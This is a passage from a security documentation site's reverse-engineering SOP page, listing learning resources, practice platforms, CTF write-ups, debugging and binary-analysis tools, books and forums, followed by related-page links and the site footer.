<li class=""><strong>Awesome Reverse Engineering - Anti-Debugging</strong> - <a href="https://github.com/wtsxDev/reverse-engineering" target="_blank" rel="noopener noreferrer" class="">github.com/wtsxDev/reverse-engineering</a>
<ul>
<li class="">Collection of anti-debugging techniques</li>
</ul>
</li>
<li class=""><strong>The Ultimate Anti-Reversing Reference</strong> - <a href="http://www.anti-reversing.com/" target="_blank" rel="noopener noreferrer" class="">anti-reversing.com</a>
<ul>
<li class="">Comprehensive anti-RE techniques catalog</li>
</ul>
</li>
<li class=""><strong>Unprotect Project</strong> - <a href="https://unprotect.it/" target="_blank" rel="noopener noreferrer" class="">unprotect.it</a>
<ul>
<li class="">Malware evasion techniques database</li>
</ul>
</li>
</ul>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="practice-platforms-1">Practice Platforms<a href="#practice-platforms-1" class="hash-link" aria-label="Direct link to Practice Platforms" title="Direct link to Practice Platforms" translate="no">​</a></h3>
<ul>
<li class=""><strong>Crackmes.one</strong> - <a href="https://crackmes.one/" target="_blank" rel="noopener noreferrer" class="">crackmes.one</a>
<ul>
<li class="">Community crackme challenges (all difficulty levels)</li>
</ul>
</li>
<li class=""><strong>Reverse Engineering StackExchange</strong> - <a href="https://reverseengineering.stackexchange.com/" target="_blank" rel="noopener noreferrer" class="">reverseengineering.stackexchange.com</a>
<ul>
<li class="">Q&amp;A forum for reverse engineering</li>
</ul>
</li>
<li class=""><strong>PicoCTF</strong> - <a href="https://picoctf.org/" target="_blank" rel="noopener noreferrer" class="">picoctf.org</a>
<ul>
<li class="">Beginner-friendly CTF with RE challenges</li>
</ul>
</li>
<li class=""><strong>Pwnable.kr</strong> - <a href="http://pwnable.kr/" target="_blank" rel="noopener noreferrer" class="">pwnable.kr</a>
<ul>
<li class="">Korean wargame with binary exploitation challenges</li>
</ul>
</li>
<li class=""><strong>Pwnable.tw</strong> - <a href="https://pwnable.tw/" target="_blank" rel="noopener noreferrer" class="">pwnable.tw</a>
<ul>
<li class="">Taiwan wargame with advanced exploitation challenges</li>
</ul>
</li>
<li class=""><strong>HackTheBox</strong> - <a href="https://www.hackthebox.com/" target="_blank" rel="noopener noreferrer" class="">hackthebox.com</a>
<ul>
<li class="">Reversing and binary exploitation boxes</li>
</ul>
</li>
</ul>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="ctf-write-ups--solutions">CTF Write-ups &amp; Solutions<a href="#ctf-write-ups--solutions" class="hash-link" aria-label="Direct link to CTF Write-ups &amp; Solutions" title="Direct link to CTF Write-ups &amp; Solutions" translate="no">​</a></h3>
<ul>
<li class=""><strong>CTFtime Write-ups</strong> - <a href="https://ctftime.org/writeups" target="_blank" rel="noopener noreferrer" class="">ctftime.org/writeups</a>
<ul>
<li class="">CTF solutions database (search for RE challenges)</li>
</ul>
</li>
<li class=""><strong>Google CTF Write-ups</strong> - <a href="https://github.com/google/google-ctf" target="_blank" rel="noopener noreferrer" class="">github.com/google/google-ctf</a>
<ul>
<li class="">Official Google CTF challenge write-ups</li>
</ul>
</li>
<li class=""><strong>LiveOverflow YouTube</strong> - <a href="https://www.youtube.com/c/LiveOverflow" target="_blank" rel="noopener noreferrer" class="">youtube.com/c/LiveOverflow</a>
<ul>
<li class="">Binary exploitation and RE video tutorials</li>
</ul>
</li>
</ul>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="blogs--research">Blogs &amp; Research<a href="#blogs--research" class="hash-link" aria-label="Direct link to Blogs &amp; Research" title="Direct link to Blogs &amp; Research" translate="no">​</a></h3>
<ul>
<li class=""><strong>Trail of Bits Blog</strong> - <a href="https://blog.trailofbits.com/" target="_blank" rel="noopener noreferrer" class="">blog.trailofbits.com</a>
<ul>
<li class="">Security research and reverse engineering articles</li>
</ul>
</li>
<li class=""><strong>RET2 Systems Blog</strong> - <a href="https://blog.ret2.io/" target="_blank" rel="noopener noreferrer" class="">blog.ret2.io</a>
<ul>
<li class="">Vulnerability research and exploit development</li>
</ul>
</li>
<li class=""><strong>Windows Internals Blog</strong> - <a href="https://www.windows-internals.com/blog/" target="_blank" rel="noopener noreferrer" class="">windows-internals.com/blog</a>
<ul>
<li class="">Windows kernel and internals research</li>
</ul>
</li>
<li class=""><strong>Phrack Magazine</strong> - <a href="http://phrack.org/" target="_blank" rel="noopener noreferrer" class="">phrack.org</a>
<ul>
<li class="">Classic hacking/exploitation zine (historical techniques)</li>
</ul>
</li>
</ul>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="debugging--dynamic-analysis">Debugging &amp; Dynamic Analysis<a href="#debugging--dynamic-analysis" class="hash-link" aria-label="Direct link to Debugging &amp; Dynamic Analysis" title="Direct link to Debugging &amp; Dynamic Analysis" translate="no">​</a></h3>
<ul>
<li class=""><strong>Frida Documentation</strong> - <a href="https://frida.re/docs/" target="_blank" rel="noopener noreferrer" class="">frida.re/docs</a>
<ul>
<li class="">Official Frida dynamic instrumentation guide</li>
</ul>
</li>
<li class=""><strong>Pin Documentation</strong> - <a href="https://software.intel.com/content/www/us/en/develop/articles/pin-a-dynamic-binary-instrumentation-tool.html" target="_blank" rel="noopener noreferrer" class="">intel.com/content/www/us/en/developer/articles/tool/pin-a-dynamic-binary-instrumentation-tool.html</a>
<ul>
<li class="">Intel Pin instrumentation framework</li>
</ul>
</li>
<li class=""><strong>GDB Cheat Sheet</strong> - <a href="https://darkdust.net/files/GDB%20Cheat%20Sheet.pdf" target="_blank" rel="noopener noreferrer" class="">darkdust.net/files/GDB%20Cheat%20Sheet.pdf</a>
<ul>
<li class="">Quick GDB command reference</li>
</ul>
</li>
<li class=""><strong>pwndbg Documentation</strong> - <a href="https://github.com/pwndbg/pwndbg" target="_blank" rel="noopener noreferrer" class="">github.com/pwndbg/pwndbg</a>
<ul>
<li class="">GDB enhancement for exploit development</li>
</ul>
</li>
<li class=""><strong>GEF Documentation</strong> - <a href="https://hugsy.github.io/gef/" target="_blank" rel="noopener noreferrer" class="">hugsy.github.io/gef</a>
<ul>
<li class="">GDB Enhanced Features guide</li>
</ul>
</li>
</ul>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="binary-analysis-tools">Binary Analysis Tools<a href="#binary-analysis-tools" class="hash-link" aria-label="Direct link to Binary Analysis Tools" title="Direct link to Binary Analysis Tools" translate="no">​</a></h3>
<ul>
<li class=""><strong>Binary Refinery</strong> - <a href="https://github.com/binref/refinery" target="_blank" rel="noopener noreferrer" class="">github.com/binref/refinery</a>
<ul>
<li class="">Python-based binary analysis toolkit with 100+ tools</li>
<li class="">Data extraction, deobfuscation, format parsing</li>
</ul>
</li>
<li class=""><strong>angr Documentation</strong> - <a href="https://docs.angr.io/" target="_blank" rel="noopener noreferrer" class="">docs.angr.io</a>
<ul>
<li class="">Binary analysis framework (symbolic execution, CFG recovery)</li>
</ul>
</li>
<li class=""><strong>Triton</strong> - <a href="https://triton.quarkslab.com/" target="_blank" rel="noopener noreferrer" class="">triton.quarkslab.com</a>
<ul>
<li class="">Dynamic symbolic execution framework</li>
</ul>
</li>
<li class=""><strong>Unicorn Engine</strong> - <a href="https://www.unicorn-engine.org/" target="_blank" rel="noopener noreferrer" class="">unicorn-engine.org</a>
<ul>
<li class="">Lightweight CPU emulator for RE</li>
</ul>
</li>
</ul>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="platform-specific-resources">Platform-Specific Resources<a href="#platform-specific-resources" class="hash-link" aria-label="Direct link to Platform-Specific Resources" title="Direct link to Platform-Specific Resources" translate="no">​</a></h3>
<p><strong>Windows:</strong></p>
<ul>
<li class=""><strong>Windows Internals (Book Series)</strong> by Mark Russinovich</li>
<li class=""><strong>Undocumented Windows Functions</strong> - <a href="http://undocumented.ntinternals.net/" target="_blank" rel="noopener noreferrer" class="">undocumented.ntinternals.net</a></li>
<li class=""><strong>WinAPI Index</strong> - <a href="https://docs.microsoft.com/en-us/windows/win32/api/" target="_blank" rel="noopener noreferrer" class="">docs.microsoft.com/en-us/windows/win32/api</a></li>
</ul>
<p><strong>Linux:</strong></p>
<ul>
<li class=""><strong>Linux Syscall Reference</strong> - <a href="https://man7.org/linux/man-pages/man2/syscalls.2.html" target="_blank" rel="noopener noreferrer" class="">man7.org/linux/man-pages/man2/syscalls.2.html</a></li>
<li class=""><strong>Linux Kernel Documentation</strong> - <a href="https://www.kernel.org/doc/" target="_blank" rel="noopener noreferrer" class="">kernel.org/doc</a></li>
</ul>
<p><strong>.NET:</strong></p>
<ul>
<li class=""><strong>dnSpy</strong> - <a href="https://github.com/dnSpy/dnSpy" target="_blank" rel="noopener noreferrer" class="">github.com/dnSpy/dnSpy</a></li>
<li class=""><strong>.NET Deobfuscation Guide</strong> - <a href="https://github.com/NotPrab/.NET-Obfuscator" target="_blank" rel="noopener noreferrer" class="">github.com/NotPrab/.NET-Obfuscator</a></li>
</ul>
<p><strong>Android:</strong></p>
<ul>
<li class=""><strong>JADX</strong> - <a href="https://github.com/skylot/jadx" target="_blank" rel="noopener noreferrer" class="">github.com/skylot/jadx</a></li>
<li class=""><strong>Frida for Android</strong> - <a href="https://frida.re/docs/android/" target="_blank" rel="noopener noreferrer" class="">frida.re/docs/android</a></li>
</ul>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="pwntools--automation">Pwntools &amp; Automation<a href="#pwntools--automation" class="hash-link" aria-label="Direct link to Pwntools &amp; Automation" title="Direct link to Pwntools &amp; Automation" translate="no">​</a></h3>
<ul>
<li class=""><strong>pwntools Documentation</strong> - <a href="https://docs.pwntools.com/" target="_blank" rel="noopener noreferrer" class="">docs.pwntools.com</a>
<ul>
<li class="">Python exploit development framework</li>
</ul>
</li>
<li class=""><strong>ROPgadget</strong> - <a href="https://github.com/JonathanSalwan/ROPgadget" target="_blank" rel="noopener noreferrer" class="">github.com/JonathanSalwan/ROPgadget</a>
<ul>
<li class="">ROP gadget finder</li>
</ul>
</li>
<li class=""><strong>ropper</strong> - <a href="https://github.com/sashs/Ropper" target="_blank" rel="noopener noreferrer" class="">github.com/sashs/Ropper</a>
<ul>
<li class="">Advanced ROP gadget finder with semantic search</li>
</ul>
</li>
<li class=""><strong>one_gadget</strong> - <a href="https://github.com/david942j/one_gadget" target="_blank" rel="noopener noreferrer" class="">github.com/david942j/one_gadget</a>
<ul>
<li class="">Find one-shot RCE gadgets in libc</li>
</ul>
</li>
</ul>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="books--courses">Books &amp; Courses<a href="#books--courses" class="hash-link" aria-label="Direct link to Books &amp; Courses" title="Direct link to Books &amp; Courses" translate="no">​</a></h3>
<ul>
<li class=""><strong>Practical Reverse Engineering</strong> by Bruce Dang et al.</li>
<li class=""><strong>The IDA Pro Book</strong> by Chris Eagle</li>
<li class=""><strong>Reversing: Secrets of Reverse Engineering</strong> by Eldad Eilam</li>
<li class=""><strong>The Art of Software Security Assessment</strong> by Mark Dowd et al.</li>
<li class=""><strong>Hacking: The Art of Exploitation</strong> by Jon Erickson</li>
<li class=""><strong>SANS FOR610: Reverse-Engineering Malware</strong></li>
<li class=""><strong>SANS FOR710: Reverse Engineering Malware Advanced</strong></li>
<li class=""><strong>RPISEC Modern Binary Exploitation (MBE)</strong> - <a href="https://github.com/RPISEC/MBE" target="_blank" rel="noopener noreferrer" class="">github.com/RPISEC/MBE</a></li>
</ul>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="community--forums">Community &amp; Forums<a href="#community--forums" class="hash-link" aria-label="Direct link to Community &amp; Forums" title="Direct link to Community &amp; Forums" translate="no">​</a></h3>
<ul>
<li class=""><strong>Reddit r/ReverseEngineering</strong> - <a href="https://www.reddit.com/r/ReverseEngineering/" target="_blank" rel="noopener noreferrer" class="">reddit.com/r/ReverseEngineering</a></li>
<li class=""><strong>OpenRCE</strong> - <a href="http://www.openrce.org/" target="_blank" rel="noopener noreferrer" class="">openrce.org</a>
<ul>
<li class="">Reverse engineering community (historical, less active now)</li>
</ul>
</li>
<li class=""><strong>Tuts4You</strong> - <a href="https://tuts4you.com/" target="_blank" rel="noopener noreferrer" class="">tuts4you.com</a>
<ul>
<li class="">Cracking/reversing tutorials and forums</li>
</ul>
</li>
<li class=""><strong>OSDev Wiki</strong> - <a href="https://wiki.osdev.org/" target="_blank" rel="noopener noreferrer" class="">osdev.org</a>
<ul>
<li class="">OS development and low-level programming</li>
</ul>
</li>
</ul>
<hr>
<p><strong>Related SOPs:</strong></p>
<p><strong>Analysis:</strong></p>
<ul>
<li class=""><a class="" href="/intel-codex/Security/Analysis/sop-malware-analysis">Malware Analysis</a> - Comprehensive malware reverse engineering and behavioral analysis</li>
<li class=""><a class="" href="/intel-codex/Security/Analysis/sop-cryptography-analysis">Cryptography Analysis</a> - Analyzing encryption and cryptographic implementations</li>
<li class=""><a class="" href="/intel-codex/Security/Analysis/sop-hash-generation-methods">Hash Generation Methods</a> - File integrity and hash analysis techniques</li>
</ul>
<p><strong>Pentesting &amp; Security:</strong></p>
<ul>
<li class=""><a class="" href="/intel-codex/Security/Pentesting/sop-linux-pentest">Linux Pentesting</a> - Linux exploitation and privilege escalation</li>
<li class=""><a class="" href="/intel-codex/Security/Pentesting/sop-ad-pentest">Active Directory Pentesting</a> - Windows AD security assessment</li>
<li class=""><a class="" href="/intel-codex/Security/Pentesting/sop-web-application-security">Web Application Security</a> - Web app vulnerability assessment</li>
<li class=""><a class="" href="/intel-codex/Security/Pentesting/sop-mobile-security">Mobile Security</a> - Android/iOS security testing</li>
<li class=""><a class="" href="/intel-codex/Security/Pentesting/sop-firmware-reverse-engineering">Firmware Reverse Engineering</a> - IoT and embedded device analysis</li>
<li class=""><a class="" href="/intel-codex/Security/Pentesting/sop-vulnerability-research">Vulnerability Research</a> - Finding and analyzing security flaws</li>
<li class=""><a class="" href="/intel-codex/Security/Pentesting/sop-bug-bounty">Bug Bounty Hunting</a> - Responsible vulnerability disclosure</li>
<li class=""><a class="" href="/intel-codex/Security/Pentesting/sop-detection-evasion-testing">Detection Evasion Testing</a> - Bypassing security controls</li>
<li class=""><a class="" href="/intel-codex/Pentesting/sop-forensics-investigation">Forensics Investigation</a> - Digital forensics and incident response</li>
</ul></div><footer class="theme-doc-footer docusaurus-mt-lg"><div class="row margin-top--sm theme-doc-footer-edit-meta-row"><div class="col noPrint_WFHX"><a href="https://github.com/gl0bal01/intel-codex/tree/main/intel-codex/Security/Analysis/sop-reverse-engineering.md" target="_blank" rel="noopener noreferrer" class="theme-edit-this-page"><svg fill="currentColor" height="20" width="20" viewBox="0 0 40 40" class="iconEdit_Z9Sw" aria-hidden="true"><g><path d="m34.5 11.7l-3 3.1-6.3-6.3 3.1-3q0.5-0.5 1.2-0.5t1.1 0.5l3.9 3.9q0.5 0.4 0.5 1.1t-0.5 1.2z m-29.5 17.1l18.4-18.5 6.3 6.3-18.4 18.4h-6.3v-6.2z"></path></g></svg>Edit this page</a></div><div class="col lastUpdated_JAkA"></div></div></footer></article><nav class="docusaurus-mt-lg pagination-nav" aria-label="Docs pages"><a class="pagination-nav__link pagination-nav__link--prev" href="/intel-codex/Security/Analysis/sop-malware-analysis"><div class="pagination-nav__sublabel">Previous</div><div class="pagination-nav__label">Malware Analysis SOP</div></a><a class="pagination-nav__link pagination-nav__link--next" href="/intel-codex/category/penetration-testing"><div class="pagination-nav__sublabel">Next</div><div class="pagination-nav__label">Penetration Testing</div></a></nav></div></div><div class="col col--3"><div class="tableOfContents_bqdL thin-scrollbar theme-doc-toc-desktop"><ul class="table-of-contents table-of-contents__left-border"><li><a href="#table-of-contents" class="table-of-contents__link toc-highlight">Table of Contents</a></li><li><a href="#overview" class="table-of-contents__link toc-highlight">Overview</a><ul><li><a href="#what-is-reverse-engineering" class="table-of-contents__link toc-highlight">What is Reverse Engineering?</a></li><li><a href="#legal--ethical-considerations" class="table-of-contents__link toc-highlight">Legal &amp; Ethical Considerations</a></li><li><a href="#reverse-engineering-methodology" class="table-of-contents__link toc-highlight">Reverse Engineering Methodology</a></li></ul></li><li><a href="#reverse-engineering-fundamentals" class="table-of-contents__link toc-highlight">Reverse Engineering Fundamentals</a><ul><li><a href="#assembly-language-basics" class="table-of-contents__link toc-highlight">Assembly Language Basics</a></li><li><a href="#x86x64-assembly-fundamentals" class="table-of-contents__link toc-highlight">x86/x64 Assembly Fundamentals</a></li><li><a href="#calling-conventions" class="table-of-contents__link toc-highlight">Calling Conventions</a></li><li><a href="#stack-frames" class="table-of-contents__link toc-highlight">Stack Frames</a></li></ul></li><li><a href="#static-analysis" class="table-of-contents__link toc-highlight">Static Analysis</a><ul><li><a href="#disassemblers--decompilers" class="table-of-contents__link toc-highlight">Disassemblers &amp; Decompilers</a></li><li><a href="#ida-pro-basics" class="table-of-contents__link toc-highlight">IDA Pro Basics</a></li><li><a href="#ghidra-basics" class="table-of-contents__link toc-highlight">Ghidra Basics</a></li><li><a href="#string-analysis" class="table-of-contents__link toc-highlight">String Analysis</a></li><li><a href="#importexport-analysis" class="table-of-contents__link toc-highlight">Import/Export Analysis</a></li></ul></li><li><a href="#dynamic-analysis" class="table-of-contents__link toc-highlight">Dynamic Analysis</a><ul><li><a href="#debuggers" class="table-of-contents__link toc-highlight">Debuggers</a></li><li><a href="#x64dbg-basics" class="table-of-contents__link toc-highlight">x64dbg Basics</a></li><li><a href="#gdb-basics" class="table-of-contents__link toc-highlight">GDB Basics</a></li><li><a href="#bypassing-anti-debugging" class="table-of-contents__link toc-highlight">Bypassing Anti-Debugging</a></li><li><a href="#dynamic-instrumentation-frida" class="table-of-contents__link toc-highlight">Dynamic Instrumentation (Frida)</a></li></ul></li><li><a href="#platform-specific-reversing" class="table-of-contents__link toc-highlight">Platform-Specific Reversing</a><ul><li><a href="#windows-pe-format" class="table-of-contents__link toc-highlight">Windows PE Format</a></li><li><a href="#linux-elf-format" class="table-of-contents__link toc-highlight">Linux ELF Format</a></li><li><a href="#net-reversing" class="table-of-contents__link toc-highlight">.NET Reversing</a></li><li><a href="#android-apk-reversing" class="table-of-contents__link toc-highlight">Android APK Reversing</a></li></ul></li><li><a href="#anti-reversing-techniques" class="table-of-contents__link toc-highlight">Anti-Reversing Techniques</a><ul><li><a href="#obfuscation" class="table-of-contents__link toc-highlight">Obfuscation</a></li><li><a href="#packing" class="table-of-contents__link toc-highlight">Packing</a></li><li><a href="#anti-debugging-techniques" class="table-of-contents__link toc-highlight">Anti-Debugging Techniques</a></li><li><a href="#code-virtualization" class="table-of-contents__link toc-highlight">Code Virtualization</a></li></ul></li><li><a href="#exploit-development" class="table-of-contents__link toc-highlight">Exploit Development</a><ul><li><a href="#buffer-overflows" class="table-of-contents__link toc-highlight">Buffer Overflows</a></li><li><a href="#return-oriented-programming-rop" class="table-of-contents__link toc-highlight">Return-Oriented Programming (ROP)</a></li><li><a href="#shellcode-development" class="table-of-contents__link toc-highlight">Shellcode Development</a></li><li><a href="#bypassing-protections" class="table-of-contents__link toc-highlight">Bypassing Protections</a></li></ul></li><li><a href="#practical-workflows" class="table-of-contents__link toc-highlight">Practical Workflows</a><ul><li><a href="#crackme-challenges" class="table-of-contents__link toc-highlight">Crackme Challenges</a></li><li><a href="#patching-binaries" class="table-of-contents__link toc-highlight">Patching Binaries</a></li><li><a href="#malware-analysis-integration" class="table-of-contents__link toc-highlight">Malware Analysis Integration</a></li><li><a href="#ctf-binary-exploitation" class="table-of-contents__link toc-highlight">CTF Binary Exploitation</a></li></ul></li><li><a href="#tools-reference" class="table-of-contents__link toc-highlight">Tools Reference</a><ul><li><a href="#disassemblers--decompilers-1" class="table-of-contents__link toc-highlight">Disassemblers &amp; Decompilers</a></li><li><a href="#debuggers-1" class="table-of-contents__link toc-highlight">Debuggers</a></li><li><a href="#dynamic-instrumentation" class="table-of-contents__link toc-highlight">Dynamic Instrumentation</a></li><li><a href="#platform-specific-tools" class="table-of-contents__link toc-highlight">Platform-Specific Tools</a></li><li><a href="#exploit-development-1" class="table-of-contents__link toc-highlight">Exploit Development</a></li><li><a href="#utilities" class="table-of-contents__link toc-highlight">Utilities</a></li></ul></li><li><a href="#learning-resources" class="table-of-contents__link toc-highlight">Learning Resources</a><ul><li><a href="#books" class="table-of-contents__link toc-highlight">Books</a></li><li><a href="#practice-platforms" class="table-of-contents__link toc-highlight">Practice Platforms</a></li><li><a href="#online-courses" class="table-of-contents__link toc-highlight">Online Courses</a></li></ul></li><li><a href="#reference-resources" class="table-of-contents__link toc-highlight">Reference Resources</a><ul><li><a href="#comprehensive-knowledge-bases" class="table-of-contents__link toc-highlight">Comprehensive Knowledge Bases</a></li><li><a href="#assembly--architecture-resources" class="table-of-contents__link toc-highlight">Assembly &amp; Architecture Resources</a></li><li><a href="#tool-documentation" class="table-of-contents__link toc-highlight">Tool Documentation</a></li><li><a href="#binary-formats" class="table-of-contents__link toc-highlight">Binary Formats</a></li><li><a href="#exploit-development-resources" class="table-of-contents__link toc-highlight">Exploit Development Resources</a></li><li><a href="#cheat-sheets--quick-references" class="table-of-contents__link toc-highlight">Cheat Sheets &amp; Quick References</a></li><li><a href="#disassembly-patterns--idioms" class="table-of-contents__link toc-highlight">Disassembly Patterns &amp; Idioms</a></li><li><a href="#anti-reversing--obfuscation" class="table-of-contents__link toc-highlight">Anti-Reversing &amp; Obfuscation</a></li><li><a href="#practice-platforms-1" class="table-of-contents__link toc-highlight">Practice Platforms</a></li><li><a href="#ctf-write-ups--solutions" class="table-of-contents__link toc-highlight">CTF Write-ups &amp; Solutions</a></li><li><a href="#blogs--research" class="table-of-contents__link toc-highlight">Blogs &amp; Research</a></li><li><a href="#debugging--dynamic-analysis" class="table-of-contents__link toc-highlight">Debugging &amp; Dynamic Analysis</a></li><li><a href="#binary-analysis-tools" class="table-of-contents__link toc-highlight">Binary Analysis Tools</a></li><li><a href="#platform-specific-resources" class="table-of-contents__link toc-highlight">Platform-Specific Resources</a></li><li><a href="#pwntools--automation" class="table-of-contents__link toc-highlight">Pwntools &amp; Automation</a></li><li><a href="#books--courses" class="table-of-contents__link toc-highlight">Books &amp; Courses</a></li><li><a href="#community--forums" class="table-of-contents__link toc-highlight">Community &amp; Forums</a></li></ul></li></ul></div></div></div></div></main></div></div></div><footer class="theme-layout-footer footer footer--dark"><div class="container container-fluid"><div class="row footer__links"><div class="theme-layout-footer-column col footer__col"><div class="footer__title">Intel Codex</div><ul class="footer__items clean-list"><li class="footer__item"><a class="footer__link-item" aria-label="Intel Codex overview page" href="/intel-codex">Overview</a></li><li class="footer__item"><a href="https://github.com/gl0bal01/intel-codex" target="_blank" rel="noopener noreferrer" class="footer__link-item" aria-label="Download the Intel Codex Obsidian vault">Download Vault<svg width="13.5" height="13.5" aria-label="(opens in new tab)" class="iconExternalLink_nPIU"><use href="#theme-svg-external-link"></use></svg></a></li></ul></div><div class="theme-layout-footer-column col footer__col"><div class="footer__title">OSINT Investigations</div><ul class="footer__items clean-list"><li class="footer__item"><a class="footer__link-item" aria-label="OSINT investigation index" href="/intel-codex/Investigations/Investigations-Index">Investigation Index</a></li><li class="footer__item"><a class="footer__link-item" aria-label="Investigation techniques and methodologies" href="/intel-codex/Investigations/Techniques/Techniques-Index">Investigation Techniques</a></li><li class="footer__item"><a class="footer__link-item" aria-label="Platform-specific investigation guides" href="/intel-codex/Investigations/Platforms/Platforms-Index">Platform Guides</a></li></ul></div><div class="theme-layout-footer-column col footer__col"><div class="footer__title">Security Operations</div><ul class="footer__items clean-list"><li class="footer__item"><a class="footer__link-item" aria-label="Security analysis resources and guides" href="/intel-codex/Security/Analysis/Analysis-Index">Security Analysis</a></li><li class="footer__item"><a class="footer__link-item" aria-label="Penetration testing methodologies and tools" href="/intel-codex/Security/Pentesting/Pentesting-Index">Penetration Testing</a></li><li class="footer__item"><a class="footer__link-item" aria-label="Malware analysis procedures" href="/intel-codex/Security/Analysis/sop-malware-analysis">Malware Analysis</a></li><li class="footer__item"><a class="footer__link-item" aria-label="Reverse engineering techniques" href="/intel-codex/Security/Analysis/sop-reverse-engineering">Reverse Engineering</a></li><li class="footer__item"><a class="footer__link-item" aria-label="Digital forensics investigation procedures" href="/intel-codex/Security/Analysis/sop-forensics-investigation">Digital Forensics (DFIR)</a></li></ul></div><div class="theme-layout-footer-column col footer__col"><div class="footer__title">Resources</div><ul class="footer__items clean-list"><li class="footer__item"><a class="footer__link-item" aria-label="OSINT foundations and resources" href="/osint">OSINT Foundations</a></li><li class="footer__item"><a class="footer__link-item" aria-label="Cybersecurity resources and guides" href="/cyber">Cybersecurity</a></li><li class="footer__item"><a class="footer__link-item" aria-label="Artificial intelligence resources" href="/ai">AI Resources</a></li><li class="footer__item"><a class="footer__link-item" aria-label="Technical cheatsheets and quick references" href="/cheatsheets">Cheatsheets</a></li><li class="footer__item"><a class="footer__link-item" aria-label="Security and technology news feeds" href="/news">News Feeds</a></li><li class="footer__item"><a class="footer__link-item" aria-label="Visit our blog" href="/blog">Blog</a></li></ul></div><div class="theme-layout-footer-column col footer__col"><div class="footer__title">Community</div><ul class="footer__items clean-list"><li class="footer__item"><a class="footer__link-item" aria-label="CTF platforms and training resources" href="/blog/ctf-platforms-training">Play &amp; Learn</a></li><li class="footer__item"><a href="https://github.com/gl0bal01/" target="_blank" rel="noopener noreferrer" class="footer__link-item" aria-label="Visit gl0bal01 on GitHub">GitHub<svg width="13.5" height="13.5" aria-label="(opens in new tab)" class="iconExternalLink_nPIU"><use href="#theme-svg-external-link"></use></svg></a></li><li class="footer__item"><a href="https://discord.gg/T5tc9Rq8DV" target="_blank" rel="noopener noreferrer" class="footer__link-item" aria-label="Join gl0bal01 Discord community">Discord<svg width="13.5" height="13.5" aria-label="(opens in new tab)" class="iconExternalLink_nPIU"><use href="#theme-svg-external-link"></use></svg></a></li><li class="footer__item"><a href="https://start.me/u/gl0bal01" target="_blank" rel="noopener noreferrer" class="footer__link-item" aria-label="Visit gl0bal01 Start.me page">Start.me<svg width="13.5" height="13.5" aria-label="(opens in new tab)" class="iconExternalLink_nPIU"><use href="#theme-svg-external-link"></use></svg></a></li></ul></div></div><div class="footer__bottom text--center"><div class="footer__copyright">Copyright © 2025 gl0bal01. Built with Docusaurus.</div></div></div></footer></div>
</body>
</html>